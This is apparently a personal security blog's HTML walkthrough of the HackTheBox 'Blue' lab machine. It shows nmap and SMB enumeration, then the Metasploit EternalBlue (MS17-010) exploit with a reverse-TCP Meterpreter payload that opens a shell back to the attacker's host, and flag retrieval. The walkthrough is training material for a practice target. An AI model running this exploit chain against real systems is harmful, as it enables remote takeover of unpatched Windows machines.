@@ -1,0 +1,254 @@
+<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> HTB Blue | Biscotti Diskette </title> <meta name="author" content="Biscotti Diskette"> <meta name="description" content="Blue from HackTheBox."> <meta name="keywords" content="jekyll, jekyll-theme, academic-website, portfolio-website"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" href="/assets/css/scholar-icons.css?62b2ac103a88034e6882a5be5f3e2772"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="/assets/img/frontpage/Logo1.png?4f879aeff848659581251777fe0ab074"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://biscottidiskette.github.io/boxes/11_bluehtb/"> <script src="/assets/js/theme.js?9a0c749ec5240d9cda97bc72359a72c0"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>
+    initTheme();
+  </script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> <span class="font-weight-bold">Biscotti</span> Diskette </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item "> <a class="nav-link" href="/projects/">projects </a> </li> <li class="nav-item active"> <a class="nav-link" href="/boxes/">boxes <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/certifications/">certs </a> </li> <li class="nav-item "> <a class="nav-link" href="/bounties/">bounties </a> </li> <li class="nav-item "> <a class="nav-link" href="/cves/">cves </a> </li> <li class="nav-item "> <a class="nav-link" href="/presentations/">talks </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repos </a> </li> <li class="nav-item "> <a class="nav-link" href="/publications/">publications </a> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="ti ti-sun-moon" id="light-toggle-system"></i> <i class="ti ti-moon-filled" id="light-toggle-dark"></i> <i class="ti ti-sun-filled" id="light-toggle-light"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">HTB Blue</h1> <p class="post-description">Blue from HackTheBox.</p> </header> <article> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/htbblue/logo.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="HTB Blue Logo" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br></p> <h2>Link</h2> <p><a href="https://app.hackthebox.com/Blue" rel="external nofollow noopener" target="_blank">Room Link</a></p> <p><br></p> <h2>Process</h2> <p><br> Eternal Blue, MS17-010. Just a quick metasploit hit.</p> <p>Running nmap and getting the open ports.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/blue]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-A</span> <span class="nt">-O</span> <span class="nt">-oN</span> nmap 10.10.10.40                  
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
+Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-01-18 13:25 AEDT
+Nmap scan report <span class="k">for </span>10.10.10.40
+Host is up <span class="o">(</span>0.013s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 991 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49156/tcp open  msrpc        Microsoft Windows RPC
+49157/tcp open  msrpc        Microsoft Windows RPC
+
+&lt;snip&gt;
+</code></pre></div></div> <p><br> Use smbclient -L to list the shares running on the smb.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/blue]
+└─<span class="nv">$ </span>smbclient <span class="nt">-L</span> //10.10.10.40/                 
+Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\k</span>ali]:
+
+        Sharename       Type      Comment
+        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+        ADMIN<span class="nv">$ </span>         Disk      Remote Admin
+        C<span class="nv">$ </span>             Disk      Default share
+        IPC<span class="nv">$ </span>           IPC       Remote IPC
+        Share           Disk      
+        Users           Disk      
+Reconnecting with SMB1 <span class="k">for </span>workgroup listing.
+do_connect: Connection to 10.10.10.40 failed <span class="o">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
+Unable to connect with SMB1 <span class="nt">--</span> no workgroup available
+</code></pre></div></div> <p><br> Check the Share share with smbclient.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/blue]
+└─<span class="nv">$ </span>smbclient //10.10.10.40/Share
+Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\k</span>ali]:
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
+  <span class="nb">.</span>                                   D        0  Fri Jul 14 23:48:44 2017
+  ..                                  D        0  Fri Jul 14 23:48:44 2017
+
+                4692735 blocks of size 4096. 593022 blocks available
+</code></pre></div></div> <p><br> List the files available on the Users share. Appears to be the C:\Users folder.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/blue]
+└─<span class="nv">$ </span>smbclient //10.10.10.40/Users
+Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\k</span>ali]:
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
+  <span class="nb">.</span>                                  DR        0  Fri Jul 21 16:56:23 2017
+  ..                                 DR        0  Fri Jul 21 16:56:23 2017
+  Default                           DHR        0  Tue Jul 14 17:07:31 2009
+  desktop.ini                       AHS      174  Tue Jul 14 14:54:24 2009
+  Public                             DR        0  Tue Apr 12 17:51:29 2011
+</code></pre></div></div> <p><br> Run the vuln category of the nmap script and notice the vulnerability to ms17-010.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/blue]
+└─<span class="nv">$ </span>nmap <span class="nt">--script</span> vuln <span class="nt">-oN</span> vulnchk 10.10.10.40   
+Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-01-18 13:26 AEDT
+Nmap scan report <span class="k">for </span>10.10.10.40
+Host is up <span class="o">(</span>0.017s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 991 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49155/tcp open  unknown
+49156/tcp open  unknown
+49157/tcp open  unknown
+
+Host script results:
+|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability <span class="k">in </span>Microsoft SMBv1 servers <span class="o">(</span>ms17-010<span class="o">)</span>
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk <span class="nb">factor</span>: HIGH
+|       A critical remote code execution vulnerability exists <span class="k">in </span>Microsoft SMBv1
+|        servers <span class="o">(</span>ms17-010<span class="o">)</span><span class="nb">.</span>
+|           
+|     Disclosure <span class="nb">date</span>: 2017-03-14
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2017-0143
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|_smb-vuln-ms10-054: <span class="nb">false
+
+</span>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>110.89 seconds                             DR        0  Tue Apr 12 17:51:29 2011
+</code></pre></div></div> <p><br> Start msfconsole. Note, the q means quiet mode. It suppress the ascii art logo.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="o">[</span>★]<span class="nv">$ </span>msfconsole <span class="nt">-q</span>
+<span class="o">[</span>msf]<span class="o">(</span>Jobs:0 Agents:0<span class="o">)</span> <span class="o">&gt;&gt;</span>
+</code></pre></div></div> <p><br> Seach metasploit for ms17-010 for potential exploits.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>msf]<span class="o">(</span>Jobs:0 Agents:0<span class="o">)</span> <span class="o">&gt;&gt;</span> search ms17-010
+
+Matching Modules
+<span class="o">================</span>
+
+   <span class="c">#  Name                                      Disclosure Date  Rank     Check  Description</span>
+   -  <span class="nt">----</span>                                      <span class="nt">---------------</span>  <span class="nt">----</span>     <span class="nt">-----</span>  <span class="nt">-----------</span>
+   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
+   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+
+
+Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
+
+<span class="o">[</span>msf]<span class="o">(</span>Jobs:0 Agents:0<span class="o">)</span> <span class="o">&gt;&gt;</span> use exploit/windows/smb/ms17_010_eternalblue
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+</code></pre></div></div> <p><br> Use show options to see all of the options for this exploit. Notice that rhosts is required so the exploit knows who to attack. Also set lhost to the IP address to the IP address of the tun0 interface.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>msf]<span class="o">(</span>Jobs:0 Agents:0<span class="o">)</span> exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span> <span class="o">&gt;&gt;</span> show options
+
+Module options <span class="o">(</span>exploit/windows/smb/ms17_010_eternalblue<span class="o">)</span>:
+
+   Name           Current Setting  Required  Description
+   <span class="nt">----</span>           <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   RHOSTS                          <span class="nb">yes       </span>The target host<span class="o">(</span>s<span class="o">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT          445              <span class="nb">yes       </span>The target port <span class="o">(</span>TCP<span class="o">)</span>
+   SMBDomain                       no        <span class="o">(</span>Optional<span class="o">)</span> The Windows domain to use <span class="k">for </span>authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target mac
+                                             hines.
+   SMBPass                         no        <span class="o">(</span>Optional<span class="o">)</span> The password <span class="k">for </span>the specified username
+   SMBUser                         no        <span class="o">(</span>Optional<span class="o">)</span> The username to authenticate as
+   VERIFY_ARCH    <span class="nb">true             yes       </span>Check <span class="k">if </span>remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machine
+                                             s.
+   VERIFY_TARGET  <span class="nb">true             yes       </span>Check <span class="k">if </span>remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
+
+
+Payload options <span class="o">(</span>windows/x64/meterpreter/reverse_tcp<span class="o">)</span>:
+
+   Name      Current Setting  Required  Description
+   <span class="nt">----</span>      <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   EXITFUNC  thread           <span class="nb">yes       </span>Exit technique <span class="o">(</span>Accepted: <span class="s1">''</span>, seh, thread, process, none<span class="o">)</span>
+   LHOST     95.111.216.26    <span class="nb">yes       </span>The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
+   LPORT     4444             <span class="nb">yes       </span>The listen port
+
+
+Exploit target:
+
+   Id  Name
+   <span class="nt">--</span>  <span class="nt">----</span>
+   0   Automatic Target
+
+
+
+View the full module info with the info, or info <span class="nt">-d</span> command.
+
+<span class="o">[</span>msf]<span class="o">(</span>Jobs:0 Agents:0<span class="o">)</span> exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="nb">set </span>rhosts 10.10.10.40
+rhosts <span class="o">=&gt;</span> 10.10.10.40
+<span class="o">[</span>msf]<span class="o">(</span>Jobs:0 Agents:0<span class="o">)</span> exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="nb">set </span>lhost tun0
+lhost <span class="o">=&gt;</span> 10.10.14.29
+<span class="o">[</span>msf]<span class="o">(</span>Jobs:0 Agents:0<span class="o">)</span> exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span> <span class="o">&gt;&gt;</span> <span class="nb">set </span>lhost tun0
+lhost <span class="o">=&gt;</span> 10.10.14.29
+<span class="o">[</span>msf]<span class="o">(</span>Jobs:0 Agents:0<span class="o">)</span> exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span> <span class="o">&gt;&gt;</span>
+</code></pre></div></div> <p><br> Run the exploit.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>windows/smb/ms17_010_eternalblue<span class="o">)</span> <span class="o">&gt;</span> exploit
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.16.3:4444 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+<span class="o">[</span>+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 <span class="o">(</span>64-bit<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.40:445       - Scanned 1 of 1 hosts <span class="o">(</span>100% <span class="nb">complete</span><span class="o">)</span>
+<span class="o">[</span>+] 10.10.10.40:445 - The target is vulnerable.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.40:445 - Connecting to target <span class="k">for </span>exploitation.
+<span class="o">[</span>+] 10.10.10.40:445 - Connection established <span class="k">for </span>exploitation.
+<span class="o">[</span>+] 10.10.10.40:445 - Target OS selected valid <span class="k">for </span>OS indicated by SMB reply
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.40:445 - CORE raw buffer dump <span class="o">(</span>42 bytes<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+<span class="o">[</span>+] 10.10.10.40:445 - Target <span class="nb">arch </span>selected valid <span class="k">for </span><span class="nb">arch </span>indicated by DCE/RPC reply
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.40:445 - Sending all but last fragment of exploit packet
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.40:445 - Starting non-paged pool grooming
+<span class="o">[</span>+] 10.10.10.40:445 - Sending SMBv2 buffers
+<span class="o">[</span>+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.40:445 - Sending final SMBv2 buffers.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.40:445 - Sending last fragment of exploit packet!
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.40:445 - Receiving response from exploit packet
+<span class="o">[</span>+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully <span class="o">(</span>0xC000000D<span class="o">)!</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.40:445 - Sending egg to corrupted connection.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.40:445 - Triggering free of corrupted buffer.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>203846 bytes<span class="o">)</span> to 10.10.10.40
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 1 opened <span class="o">(</span>10.10.16.3:4444 -&gt; 10.10.10.40:49158<span class="o">)</span> at 2025-01-18 14:08:36 +1100
+<span class="o">[</span>+] 10.10.10.40:445 - <span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>
+<span class="o">[</span>+] 10.10.10.40:445 - <span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span><span class="nt">-WIN-</span><span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>
+<span class="o">[</span>+] 10.10.10.40:445 - <span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>
+
+meterpreter <span class="o">&gt;</span>
+</code></pre></div></div> <p><br> Drop into a shell.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> shell
+Process 2676 created.
+Channel 1 created.
+Microsoft Windows <span class="o">[</span>Version 6.1.7601]
+Copyright <span class="o">(</span>c<span class="o">)</span> 2009 Microsoft Corporation.  All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+</code></pre></div></div> <p><br> Get the user.txt flag.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\h</span>aris<span class="se">\D</span>esktop&gt;type user.txt
+<span class="nb">type </span>user.txt
+&lt;redacted&gt;
+
+C:<span class="se">\U</span>sers<span class="se">\h</span>aris<span class="se">\D</span>esktop&gt;ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Local Area Connection:
+
+   Connection-specific DNS Suffix  <span class="nb">.</span> : 
+   IPv6 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : dead:beef::4c07:5164:fe9d:5b4f
+   Temporary IPv6 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : dead:beef::50a6:137:7e7f:43bc
+   Link-local IPv6 Address <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : fe80::4c07:5164:fe9d:5b4f%11
+   IPv4 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 10.10.10.40
+   Subnet Mask <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 255.255.255.0
+   Default Gateway <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : fe80::250:56ff:feb9:6def%11
+                                       10.10.10.2
+
+Tunnel adapter isatap.<span class="o">{</span>CBC67B8A-5031-412C-AEA7-B3186D30360E<span class="o">}</span>:
+
+   Media State <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : Media disconnected
+   Connection-specific DNS Suffix  <span class="nb">.</span> : 
+
+Tunnel adapter Teredo Tunneling Pseudo-Interface:
+
+   Media State <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : Media disconnected
+   Connection-specific DNS Suffix  <span class="nb">.</span> :
+</code></pre></div></div> <p><br> Get the root.txt flag.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;type root.txt
+<span class="nb">type </span>root.txt
+&lt;redacted&gt;
+
+C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Local Area Connection:
+
+   Connection-specific DNS Suffix  <span class="nb">.</span> : 
+   IPv6 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : dead:beef::4c07:5164:fe9d:5b4f
+   Temporary IPv6 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : dead:beef::50a6:137:7e7f:43bc
+   Link-local IPv6 Address <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : fe80::4c07:5164:fe9d:5b4f%11
+   IPv4 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 10.10.10.40
+   Subnet Mask <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 255.255.255.0
+   Default Gateway <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : fe80::250:56ff:feb9:6def%11
+                                       10.10.10.2
+
+Tunnel adapter isatap.<span class="o">{</span>CBC67B8A-5031-412C-AEA7-B3186D30360E<span class="o">}</span>:
+
+   Media State <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : Media disconnected
+   Connection-specific DNS Suffix  <span class="nb">.</span> : 
+
+Tunnel adapter Teredo Tunneling Pseudo-Interface:
+
+   Media State <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : Media disconnected
+</code></pre></div></div> <p><br> If you really like metasploit blue, I have a THM box doing it too.</p> </article> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> © Copyright 2025 Biscotti Diskette. Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js?a0db7e5d5c70cc3252b3138b0c91dcaf" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" 